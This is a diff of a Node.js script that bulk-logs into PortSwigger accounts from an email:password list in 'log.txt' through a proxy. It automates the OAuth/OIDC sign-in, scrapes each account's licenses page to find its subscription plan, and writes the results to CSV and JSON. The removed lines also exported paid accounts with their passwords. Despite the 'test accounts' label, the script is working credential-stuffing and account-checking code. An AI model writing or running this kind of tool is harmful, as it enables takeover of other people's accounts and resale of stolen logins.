@@ -1,15 +1,14 @@
 #!/usr/bin/env node
 
 /**
- * Improved batch subscription extraction for 217 PortSwigger test accounts
- * Properly completes OAuth2/OIDC flow to establish authenticated session
+ * Batch subscription extraction for all 217 PortSwigger test accounts
+ * Uses HTTP-only approach with form parsing (no browser needed)
  *
- * Usage: node extract_all_subscriptions_v2.js
+ * Usage: node extract_all_subscriptions.js
  *
  * Output:
- * - subscriptions_results.csv: CSV with all results
- * - subscriptions_results.json: JSON with detailed data
- * - paid_accounts.txt: Paid accounts in log.txt format (email:password:plan)
+ * - subscriptions_results.csv: CSV file with all results
+ * - subscriptions_results.json: JSON file with detailed data
  * - subscriptions_summary.txt: Summary statistics
  */
 
@@ -28,10 +27,12 @@ const CODE_CHALLENGE = 'BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk';
 const httpsAgent = new HttpsProxyAgent(PROXY);
 const httpAgent = new HttpProxyAgent(PROXY);
 
+// Configuration
 const REQUEST_TIMEOUT = 30000;
 const MAX_REDIRECTS = 10;
 const CONCURRENT_REQUESTS = 3;
 
+// Stats tracking
 const stats = {
     total: 0,
     successful: 0,
@@ -48,7 +49,6 @@ const stats = {
 };
 
 const results = [];
-const paidAccounts = [];
 
 function setCookie(setCookieHeader, cookies) {
     if (!setCookieHeader) return;
@@ -125,10 +125,12 @@ function extractPlan(html) {
 
     const lowerHtml = html.toLowerCase();
 
+    // Check for free accounts
     if (lowerHtml.includes('you do not have any subscriptions')) {
         return 'Free';
     }
 
+    // Check for specific subscription types with better accuracy
     if (lowerHtml.includes('burp suite enterprise') ||
         (lowerHtml.includes('enterprise') && lowerHtml.includes('subscription'))) {
         return 'Enterprise';
@@ -148,6 +150,7 @@ function extractPlan(html) {
         return 'Community';
     }
 
+    // Generic check for any subscription
     if (lowerHtml.includes('subscription') || lowerHtml.includes('your subscriptions')) {
         return 'Professional';
     }
@@ -159,13 +162,13 @@ async function authWithHTTP(username, password) {
     const cookies = {};
 
     try {
-        // Step 1: Get authorization URL with state
+        // Step 1: Get state
         const authorizeUrl = `https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=${CODE_CHALLENGE}&code_challenge_method=S256&response_mode=query`;
         let res = await makeRequest({ url: authorizeUrl, method: 'GET' }, null, cookies);
         let state = res.body.match(/state=([^&\s'"]+)/)?.[1];
         if (!state) throw new Error('Failed to extract state');
 
-        // Step 2: Login POST
+        // Step 2: Login
         const loginData = urlencode({ username, password, action: 'default', state });
         res = await makeRequest(
             {
@@ -180,114 +183,108 @@ async function authWithHTTP(username, password) {
             cookies
         );
 
-        // Step 3: Follow OAuth redirects until we get to a page with content
+        // Step 3: Follow OAuth redirects
         let redirectUrl = res.location;
         let redirectCount = 0;
         for (let i = 0; i < MAX_REDIRECTS && redirectUrl; i++) {
             if (!redirectUrl.startsWith('http')) redirectUrl = 'https://login.portswigger.net' + redirectUrl;
             res = await makeRequest({ url: redirectUrl, method: 'GET' }, null, cookies);
             redirectCount++;
-
             if (res.status !== 302 || !res.location) break;
             redirectUrl = res.location;
         }
 
-        // Step 4: Parse form from final redirect response (usually /signin-oidc)
+        // Step 4: Parse form from /signin-oidc and submit it
         const $ = cheerio.load(res.body);
         const form = $('form').first();
 
-        if (form.length > 0) {
-            // Step 5: Submit the form
-            let formAction = form.attr('action');
-            if (!formAction) formAction = '/signin-oidc';
-            const formMethod = (form.attr('method') || 'GET').toUpperCase();
-
-            const formData = {};
-            form.find('input').each((i, elem) => {
-                const name = $(elem).attr('name');
-                const value = $(elem).attr('value');
-                if (name) {
-                    formData[name] = value || '';
-                }
-            });
-
-            let targetUrl = formAction;
-            if (!targetUrl.startsWith('http')) {
-                if (!targetUrl.startsWith('/')) {
-                    targetUrl = '/signin-oidc?/' + targetUrl;
-                }
-                targetUrl = 'https://portswigger.net' + targetUrl;
-            }
-
-            const postData = urlencode(formData);
-            res = await makeRequest(
-                {
-                    url: targetUrl,
-                    method: formMethod,
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Content-Length': postData.length
-                    }
-                },
-                postData,
-                cookies
-            );
-
-            // Step 6: Follow final redirects after form submission
-            for (let i = 0; i < 5 && res.location; i++) {
-                let nextUrl = res.location;
-                if (!nextUrl.startsWith('http')) nextUrl = 'https://portswigger.net' + nextUrl;
-                res = await makeRequest({ url: nextUrl, method: 'GET' }, null, cookies);
-            }
-        } else {
-            // Form not found - try direct licenses access fallback
-            // This can happen if /authorize/resume redirects directly or returns different content
+        if (form.length === 0) {
+            // Fallback: Try direct access to licenses page (cookies may already be authenticated)
             res = await makeRequest(
                 { url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' },
                 null,
                 cookies
             );
 
-            // Follow redirect chain if needed
+            // Follow redirects if needed
             for (let i = 0; i < 5 && res.status === 302 && res.location; i++) {
                 let redirectUrl = res.location;
                 if (!redirectUrl.startsWith('http')) redirectUrl = 'https://portswigger.net' + redirectUrl;
                 res = await makeRequest({ url: redirectUrl, method: 'GET' }, null, cookies);
             }
-        }
 
-        // Step 7: Get licenses page to extract subscription info
-        res = await makeRequest(
-            { url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' },
-            null,
-            cookies
-        );
-
-        if (res.status === 200 && (res.body.includes('subscriptions') || res.body.includes('account'))) {
-            return {
-                success: true,
-                html: res.body
-            };
-        }
-
-        // If direct access still doesn't work, try following one more redirect
-        if (res.status === 302 && res.location) {
-            let redirectUrl = res.location;
-            if (!redirectUrl.startsWith('http')) redirectUrl = 'https://portswigger.net' + redirectUrl;
-            res = await makeRequest({ url: redirectUrl, method: 'GET' }, null, cookies);
-
+            // Check if we got authenticated access
             if (res.status === 200 && (res.body.includes('subscriptions') || res.body.includes('account'))) {
                 return {
                     success: true,
                     html: res.body
                 };
             }
+
+            throw new Error('Form not found on /signin-oidc page');
         }
 
-        return {
-            success: false,
-            error: `Status ${res.status}, Body length: ${res.body.length}`
-        };
+        let formAction = form.attr('action');
+        if (!formAction) {
+            formAction = '/signin-oidc';
+        }
+
+        const formMethod = (form.attr('method') || 'GET').toUpperCase();
+
+        const formData = {};
+        form.find('input').each((i, elem) => {
+            const name = $(elem).attr('name');
+            const value = $(elem).attr('value');
+            if (name) {
+                formData[name] = value || '';
+            }
+        });
+
+        let targetUrl = formAction;
+        if (!targetUrl.startsWith('http')) {
+            if (!targetUrl.startsWith('/')) {
+                targetUrl = '/signin-oidc?/' + targetUrl;
+            }
+            targetUrl = 'https://portswigger.net' + targetUrl;
+        }
+
+        const postData = urlencode(formData);
+        res = await makeRequest(
+            {
+                url: targetUrl,
+                method: formMethod,
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Length': postData.length
+                }
+            },
+            postData,
+            cookies
+        );
+
+        // Follow redirects after form submission
+        for (let i = 0; i < 5 && res.location; i++) {
+            let nextUrl = res.location;
+            if (!nextUrl.startsWith('http')) nextUrl = 'https://portswigger.net' + nextUrl;
+            res = await makeRequest({ url: nextUrl, method: 'GET' }, null, cookies);
+        }
+
+        // Step 5: Get licenses page
+        res = await makeRequest({ url: 'https://portswigger.net/users/youraccount/licenses', method: 'GET' }, null, cookies);
+
+        // Check if authenticated
+        if (res.status === 200 && (res.body.includes('subscriptions') || res.body.includes('account'))) {
+            return {
+                success: true,
+                html: res.body
+            };
+        } else {
+            return {
+                success: false,
+                error: `Status ${res.status}`,
+                html: res.body.substring(0, 200)
+            };
+        }
 
     } catch (error) {
         return {
@@ -316,10 +313,6 @@ async function processAccount(username, password, index, total) {
                 status: 'Success',
                 timestamp: new Date().toISOString()
             });
-
-            if (plan !== 'Free' && plan !== 'Unknown') {
-                paidAccounts.push({ username, password, plan });
-            }
 
             console.log(`✓ ${plan}`);
             return true;
@@ -387,15 +380,6 @@ function exportResults() {
     fs.writeFileSync('subscriptions_results.json', JSON.stringify(results, null, 2));
     console.log('✓ JSON exported: subscriptions_results.json');
 
-    // Export paid accounts in log.txt format
-    if (paidAccounts.length > 0) {
-        const paidContent = paidAccounts
-            .map(a => `${a.username}:${a.password}:${a.plan}`)
-            .join('\n');
-        fs.writeFileSync('paid_accounts.txt', paidContent);
-        console.log(`✓ Paid accounts exported: paid_accounts.txt (${paidAccounts.length} accounts)`);
-    }
-
     // Generate summary
     const summary = `
 ================================================================================
@@ -407,15 +391,12 @@ Successful: ${stats.successful} (${((stats.successful/stats.total)*100).toFixed(
 Failed: ${stats.failed} (${((stats.failed/stats.total)*100).toFixed(1)}%)
 
 PLAN DISTRIBUTION:
-  Free:         ${stats.plans['Free']} (${stats.successful > 0 ? ((stats.plans['Free']/stats.successful)*100).toFixed(1) : 0}% of successful)
-  Professional: ${stats.plans['Professional']} (${stats.successful > 0 ? ((stats.plans['Professional']/stats.successful)*100).toFixed(1) : 0}% of successful)
-  Team:         ${stats.plans['Team']} (${stats.successful > 0 ? ((stats.plans['Team']/stats.successful)*100).toFixed(1) : 0}% of successful)
-  Enterprise:   ${stats.plans['Enterprise']} (${stats.successful > 0 ? ((stats.plans['Enterprise']/stats.successful)*100).toFixed(1) : 0}% of successful)
-  Community:    ${stats.plans['Community']} (${stats.successful > 0 ? ((stats.plans['Community']/stats.successful)*100).toFixed(1) : 0}% of successful)
-  Unknown:      ${stats.plans['Unknown']} (${stats.successful > 0 ? ((stats.plans['Unknown']/stats.successful)*100).toFixed(1) : 0}% of successful)
-
-PAID ACCOUNTS (excluding Free):
-  Total: ${paidAccounts.length}
+  Free:        ${stats.plans['Free']} (${((stats.plans['Free']/stats.successful)*100).toFixed(1)}% of successful)
+  Professional: ${stats.plans['Professional']} (${((stats.plans['Professional']/stats.successful)*100).toFixed(1)}% of successful)
+  Team:        ${stats.plans['Team']} (${((stats.plans['Team']/stats.successful)*100).toFixed(1)}% of successful)
+  Enterprise:  ${stats.plans['Enterprise']} (${((stats.plans['Enterprise']/stats.successful)*100).toFixed(1)}% of successful)
+  Community:   ${stats.plans['Community']} (${((stats.plans['Community']/stats.successful)*100).toFixed(1)}% of successful)
+  Unknown:     ${stats.plans['Unknown']} (${((stats.plans['Unknown']/stats.successful)*100).toFixed(1)}% of successful)
 
 TOP ERRORS:
 ${Object.entries(stats.errors)
@@ -428,7 +409,6 @@ ${Object.entries(stats.errors)
 Results saved to:
   - subscriptions_results.csv
   - subscriptions_results.json
-  - paid_accounts.txt (${paidAccounts.length} paid accounts)
   - subscriptions_summary.txt
 ================================================================================
 `;
@@ -439,14 +419,16 @@ Results saved to:
 
 async function main() {
     console.log('================================================================================');
-    console.log('PortSwigger Subscription Extraction - Improved Batch Processor');
+    console.log('PortSwigger Subscription Extraction - Batch Processor');
     console.log('================================================================================\n');
 
+    // Load accounts
     console.log('Loading accounts from log.txt...');
     const accounts = await loadAccountsFromFile('log.txt');
     stats.total = accounts.length;
     console.log(`Loaded ${accounts.length} accounts\n`);
 
+    // Process accounts with concurrency control
     console.log('Processing accounts (this may take several minutes)...\n');
 
     for (let i = 0; i < accounts.length; i += CONCURRENT_REQUESTS) {
@@ -457,11 +439,13 @@ async function main() {
 
         await Promise.all(promises);
 
+        // Simple rate limiting
         if (i + CONCURRENT_REQUESTS < accounts.length) {
             await new Promise(resolve => setTimeout(resolve, 500));
         }
     }
 
+    // Export results
     console.log('\nExporting results...');
     exportResults();
 }
